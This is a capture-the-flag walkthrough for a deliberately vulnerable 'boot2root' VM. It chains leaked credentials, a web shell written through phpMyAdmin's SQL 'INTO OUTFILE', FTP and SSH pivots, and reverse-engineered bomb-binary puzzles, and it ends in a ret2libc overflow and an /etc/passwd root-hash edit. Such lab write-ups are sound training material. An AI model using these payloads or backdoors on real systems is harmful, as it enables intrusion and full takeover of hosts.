0- Start VM:
    - VirtualBox -> Configuration -> Network -> Network access mode: bridge -> OK
    - Start VM

1- Find VM IP:
    - On Salty's VM:
        nmap -sn 192.168.0.0/16

        we get:
        Starting Nmap 7.60 ( https://nmap.org ) at 2020-11-20 12:44 CET
        Nmap scan report for 192.168.0.1
        Host is up (0.0047s latency).
        Nmap scan report for 192.168.0.19
        Host is up (0.0024s latency).
        Nmap done: 256 IP addresses (2 hosts up) scanned in 3.18 seconds

        So we have 2 IP addresses, we try entering them on a web browser
        We have a page for 192.168.0.19 with this written: 
            Hack me
            We're Coming Soon
        We have our IP!

2- Scan IP
    - We use dirsearch:
        git clone https://github.com/maurosoria/dirsearch ; cd dirsearch

    - python3 dirsearch.py -u https://192.168.0.19
          _|. _ _  _  _  _ _|_    v0.4.0
         (_||| _) (/_(_|| (_| )
        
        Extensions: php, asp, aspx, jsp, html, htm, js | HTTP method: GET | Threads: 20 | Wordlist size: 10023
        
        Error Log: /home/user42/Projets/boot2root/dirsearch/logs/errors-20-11-20_13-16-35.log
        
        Target: https://192.168.0.19/
        
        Output File: /home/user42/Projets/boot2root/dirsearch/reports/192.168.0.19/_20-11-20_13-16-35.txt
    
        [13:16:35] Starting: 
        [13:16:52] 403 -  289B  - /cgi-bin/
        [13:16:56] 301 -  314B  - /forum  ->  https://192.168.0.19/forum/
        [13:17:04] 301 -  319B  - /phpmyadmin  ->  https://192.168.0.19/phpmyadmin/
        [13:17:05] 200 -    7KB - /phpmyadmin/
        [13:17:06] 403 -  294B  - /server-status
        [13:17:06] 403 -  295B  - /server-status/
        [13:17:11] 403 -  307B  - /webmail/src/configtest.php
        [13:17:11] 302 -    0B  - /webmail/  ->  src/login.php
        
        Task Completed

        So we see that we have 3 accessible pages:
            https://192.168.0.19/forum
            https://192.168.0.19/phpmyadmin
            https://192.168.0.19/webmail

    - There is only one important page on the forum which is this one:
        https://192.168.0.19/forum/index.php?mode=thread&id=6
        
        On this page we find these lines that look like a user mistake:
            Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
        Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
        Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)

        The important informations we retrieve here are a failed password for a user that does not exist on the user's list (!q\]Ej?*5K5cy*AJ) and then an opened session for the user lmezard 30 seconds later. It looks like Laurie entered her password instead of her login.
        We can now login as lmezard on the forum with the following combo:
            lmezard:!q\]Ej?*5K5cy*AJ

    - Finding email address for user lmezard:
        https://192.168.0.19/forum/index.php?mode=user&action=edit_profile
        We find the following email: laurie@borntosec.net

    - Searching in the mail box:
        https://192.168.0.19/webmail/src/login.php
        We connect with the following combo:
            laurie@borntosec.net:!q\]Ej?*5K5cy*AJ
        There is one important e-mail: "DB Access"
            Hey Laurie,

            You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

            Best regards.
        So we now have DB root access 8)

    - Connecting to the DB:
        https://192.168.0.19/phpmyadmin/
        Connect with root:Fg-'kKXBj87E:aJ$

    - Injecting cmd to the system:
        Go to the page "SQL" and enter:
            SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "/var/www/forum/templates_c/monfichier2.php" -- 1
        Now go to the page https://192.168.0.19/forum/templates_c/monfichier2.php?cmd=whoami
        We can now enter cmd (replace whoami by whatever you want, you can put spaces)
        By searching a bit in the system with this method, we try the command
            ls /home
        And there is a homedir called "LOOKATME", so indeed we look at it
        Into this directory we find a file called "password" with the following content:
            lmezard:G!@M6f4Eatau{sF"
        We use this combo to connect in ftp with the following command:
            ftp 192.168.0.19 
        In the ftp console we activate the passive mode with the command:
            pass
        And then with:
            ls
        We find 2 files, README and fun, to transfer them we execute:
            get fun
            get README
        And they're automatically copied to the dir we executed the ftp command from

    - fun file:
        the file seems to be an archive
        we use tar -xf to unzip the file.

        we got a folder, named ft_fun with a lot of '.pcap' files inside.
        It seems that every file has a part of C code but it is a mess.

        Like every pcap file has a "//file XXX" part which seems to give us the rest of the C code.
        So we decide to make a script to convert these file to a C file: file_pcap_to_c.py

        then we start the script, compiling our C file with gcc, and finaly run the binary.
        It gave us the next sentence:

        MY PASSWORD IS: Iheartpwnage
        Now SHA-256 it and submit

        SHA-256: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

    - SSH Laurie:
        Now we can connect in SSH with the following combo:
            laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

        There is a bomb executable and a README
        We scp the bomb file into our homedir
            scp laurie@192.168.0.19:~/bomb .

        We decompile and anlyze the bomb with ghidra
        It seems like a game with 6 diferent levels
            Phase1:
                void phase_1(undefined4 param_1)
                {
                  int i;
  
                  i = strings_not_equal(param_1,"Public speaking is very easy.");
                  if (i != 0) {
                    explode_bomb();
                  }
                  return;
                }
            Very easy, we just have to enter a specific string
            >Public speaking is very easy.
            >ENTER

            Phase2:
                void phase_2(undefined4 param_1)
                {
                  int i;
                  int suite [7];
                  
                  read_six_numbers(param_1,suite + 1);
                  if (suite[1] != 1) {
                    explode_bomb();
                  }
                  i = 1;
                  do {
                    if (suite[i + 1] != (i + 1) * suite[i]) {
                      explode_bomb();
                    }
                    i = i + 1;
                  } while (i < 6);
                  return;
                }
            This is a little maths trick, we follow the algorithm to get this suite:
            i   1   2   3   4   5   6
            val 1   2   6   24  120 720
            >1 2 6 24 120 720
            >ENTER

            Phase3:
                void phase_3(undefined4 param_1)
                {
                  int i;
                  char c;
                  uint var1;
                  char var2;
                  int var3;
                  
                  i = sscanf(param_1,"%d %c %d",&var1,&var2,&var3);
                  if (i < 3) {
                    explode_bomb();
                  }
                  switch(var1) {
                  case 0:
                    c = 'q';
                    if (var3 != 0x309) {
                     explode_bomb();
                    }
                    break;
                  case 1:
                    c = 'b';
                    if (var3 != 0xd6) {
                    explode_bomb();
                    }
                    break;
                  case 2:
                    c = 'b';
                    if (var3 != 0x2f3) {
                    explode_bomb();
                    }
                    break;
                  case 3:
                    c = 'k';
                    if (var3 != 0xfb) {
                      explode_bomb();
                    }
                    break;
                  case 4:
                    c = 'o';
                    if (var3 != 0xa0) {
                      explode_bomb();
                    }
                    break;
                  case 5:
                    c = 't';
                    if (var3 != 0x1ca) {
                      explode_bomb();
                    }
                    break;
                  case 6:
                    c = 'v';
                    if (var3 != 0x30c) {
                      explode_bomb();
                    }
                    break;
                  case 7:
                    c = 'b';
                    if (var3 != 0x20c) {
                      explode_bomb();
                    }
                    break;
                  default:
                    c = 'x';
                    explode_bomb();
                  }
                  if (c != var2) {
                    explode_bomb();
                  }
                  return;
                }
            The part we focus on is this one:
              case 1:
                c = 'b';
                if (var3 != 0xd6) {
                  explode_bomb();
                }
                break;
            So we input 1 b 214
            >1 b 214
            >ENTER
            
            Phase4:
                void phase_4(undefined4 param_1)
                {
                  int i;
                  int var1;
                  
                  i = sscanf(param_1,&DAT_08049808,&var1);
                  if ((i != 1) || (var1 < 1)) {
                    explode_bomb();
                  }
                  i = func4(var1);
                  if (i != 0x37) {
                    explode_bomb();
                  }
                  return;
                }
                
                int func4(int param_1)
                {
                  int n1;
                  int n2;

                  if (param_1 < 2) {
                    n2 = 1;
                  }
                  else {
                    n1 = func4(param_1 + -1);
                    n2 = func4(param_1 + -2);
                    n2 = n2 + n1;
                  }
                  return n2;
                }
            By doing all the calculations, we find out that 9 is the best input
            >9
            >ENTER

            Phase5:
                void phase_5(int param_1)
                {
                  int i;
                  undefined str [6];
                  undefined num;
                  
                  i = string_length(param_1);
                  if (i != 6) {
                    explode_bomb();
                  }
                  i = 0;
                  do {
                    str[i] = (&array.123)[(char)(*(byte *)(i + param_1) & 0xf)];
                    i = i + 1;
                  } while (i < 6);
                  num = 0;
                  i = strings_not_equal(str,"giants");
                  if (i != 0) {
                    explode_bomb();
                  }
                  return;
                }
                This line does a rot on a custom alphabet
                    str[i] = (&array.123)[(char)(*(byte *)(i + param_1) & 0xf)];
                The custom alphabet is:
                    isrveawhobpnutfg
                We use a C program to write all the alphabet after being passed through the algorithm
                We get:
                    s r v e a w h o b p n u t f g i s r v e a w h o b p
                    a b c d e f g h i j k l m n o p q r s t u v w x y z
                We know that the result must be giants so we pick the following letters:
                    opekmq
            >opekmq
            >ENTER

            Phase6:
                void phase_6(undefined4 param_1)
                {
                  int *piVar1;
                  int iVar2;
                  int *piVar3;
                  int iVar4;
                  int *piStack56;
                  int *apiStack52 [6];
                  int aiStack28 [6];
                  
                  piStack56 = (int *)&node1;
                  read_six_numbers(param_1,aiStack28);
                  iVar4 = 0;
                  do {
                    if (5 < aiStack28[iVar4] - 1U) {
                      explode_bomb();
                    }
                    iVar2 = iVar4 + 1;
                    if (iVar2 < 6) {
                      do {
                        if (aiStack28[iVar4] == aiStack28[iVar2]) {
                          explode_bomb();
                        }
                        iVar2 = iVar2 + 1;
                      } while (iVar2 < 6);
                    }
                    iVar4 = iVar4 + 1;
                  } while (iVar4 < 6);
                  iVar4 = 0;
                  do {
                    iVar2 = 1;
                    piVar3 = piStack56;
                    if (1 < aiStack28[iVar4]) {
                      do {
                        piVar3 = (int *)piVar3[2];
                        iVar2 = iVar2 + 1;
                      } while (iVar2 < aiStack28[iVar4]);
                    }
                    apiStack52[iVar4] = piVar3;
                    iVar4 = iVar4 + 1;
                  } while (iVar4 < 6);
                  iVar4 = 1;
                  piVar3 = apiStack52[0];
                  do {
                    piVar1 = apiStack52[iVar4];
                    piVar3[2] = (int)piVar1;
                    iVar4 = iVar4 + 1;
                    piVar3 = piVar1;
                  } while (iVar4 < 6);
                  piVar1[2] = 0;
                  iVar4 = 0;
                  do {
                    if (*apiStack52[0] < *(int *)apiStack52[0][2]) {
                      explode_bomb();
                    }
                    apiStack52[0] = (int *)apiStack52[0][2];
                    iVar4 = iVar4 + 1;
                  } while (iVar4 < 5);
                  return;
                }   

                We decided to lockpick this one with the script lockpick_phase6.py
                python lockpick_phase6.py | grep Numbers
                And we get: 
                    Numbers: 4 2 6 3 1 5
                >4 2 6 3 1 5
                >ENTER
        We know have Thor's password, also, there is mentionned on 42 forum that we need to switch len-2 and len-3 char to get the correct password, so we have the following combo:
            thor:Publicspeakingisveryeasy.126241207201b2149opekmq426135

    - SSH Thor:
            ssh thor@192.168.0.19
            Publicspeakingisveryeasy.126241207201b2149opekmq426135
        There are 2 files: README and turtle
        The turtle file is basically a weird version of a LOGO language script
        We just have to replace few instructions to have the correct format:
            tourne droite = DROITE
            tourne gauche = GAUCHE
            remove spaces and degrees
        And now execute it on:
            lwh.free.fr/pages/prog/logo/logo.htm
        The drawing show us the word SLASH, that we need to digest in MD5 to get the following pass:
            646da671ca01bb5d84dbb5fb2238dc8e
        Now we can connect to zaz account with the following combo:
            zaz:646da671ca01bb5d84dbb5fb2238dc8e

    - SSH zaz:
            ssh zaz@192.168.0.19
            646da671ca01bb5d84dbb5fb2238dc8e
        There are 1 file and 1 folder exploit_me and a mail.
        with ls -l we see that exploit_me belongs to root.
        exploit_me is a binary, when we execute is with a big parameter, it segfault. We start it with gdb and try with this string:
        AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

        -> segfault at 0x6e6e6e6e -> eip at offset 140.
        We use the ret2libc method:
          info function system -> 0xb7e6b060
          find &system,+9999999,"/bin/sh" -> 0xb7f8cc58

        ./exploit_me $(python -c 'print "A"*140 + "\x60\xb0\xe6\xb7" + "AAAA" + "\x58\xcc\xf8\xb7"')
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`AAAAX
        # whoami
        root

But we're not id 0 yet
vim /etc/passwd
    root:x:0:0:aaaaaa:/root:/bin/bash
replace x with:
    firwVQs3fu3rM
It's the hashed version of "toto" with the C function "crypt" and the key "firefart"
Save and quit with :wq!
And now you can log in as root with the password toto
    su root -

